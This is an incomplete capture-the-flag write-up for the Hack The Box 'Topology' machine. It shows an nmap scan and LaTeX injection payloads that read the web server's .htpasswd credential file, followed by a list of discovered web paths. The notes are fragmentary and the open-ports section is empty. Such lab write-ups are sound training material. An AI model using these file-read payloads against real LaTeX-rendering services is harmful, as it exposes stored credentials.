# #1 Introduction
<img width="691" alt="image" src="https://github.com/Mate0r/app.hackthebock.com/assets/94843357/17b93d9f-213a-43e4-8df5-45d166672edb">

# #2 nmap

we first add a domain in /etc/hosts so we don't need to remember the IP
```bash
10.10.xx.xx topology.htb
```

we run an nmap scan as sudo so it's doing a SYN scan and not a full TCP connection so it's faster

```bash
sudo nmap -T4 -sV -p- topology.htb
```

we got these open ports
```bash

```

# #3 user.txt

## HTTP (port 80)


\newread\f
\openin\f=/var/www/dev/.htpasswd
\read\f to\l
\text{\l}
textbackslash

\newread\f \openin\f=/var/www/dev/.htpasswd \read\f to\l \read\f to\l \read\f to\l \text{\l}

\detokenize{abc_def\#gh}


\newread\f \openin\f=/var/www/dev/.htpasswd \read\f to\l \text{\l}

dev
stats
latex
wildwest
cgi-bin

